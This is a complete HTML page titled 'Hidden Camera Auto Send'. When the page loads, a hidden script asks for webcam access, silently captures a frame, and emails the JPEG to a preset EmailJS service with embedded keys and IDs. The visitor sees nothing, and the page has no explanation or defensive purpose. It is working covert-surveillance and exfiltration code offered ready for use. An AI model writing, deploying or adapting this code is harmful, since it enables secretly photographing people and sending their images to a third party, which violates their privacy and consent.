<!DOCTYPE html>
<html>
<head>
  <title>Hidden Camera Auto Send</title>
</head>
<body style="display:none">
  <video id="video" autoplay playsinline style="display:none;"></video>
  <canvas id="canvas" style="display:none;"></canvas>

  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
  <script>
    (function(){
      emailjs.init("tn_jfNpGxw_qWS6sV"); // public key
    })();

    async function captureAndSend() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.getElementById('video');
        video.srcObject = stream;

        await new Promise(resolve => setTimeout(resolve, 2000)); // 2s delay to allow camera init

        const canvas = document.getElementById('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0);

        const imageData = canvas.toDataURL('image/jpeg');

        emailjs.send("service_kmvnd5a", "template_26e7uxb", {
          message: imageData
        }).then(() => {
          console.log("Email sent");
        }).catch(err => {
          console.error("Email send error:", err);
        });

        stream.getTracks().forEach(track => track.stop());
      } catch (e) {
        console.error("Camera access error:", e);
      }
    }

    window.onload = captureAndSend;
  </script>
</body>
</html>
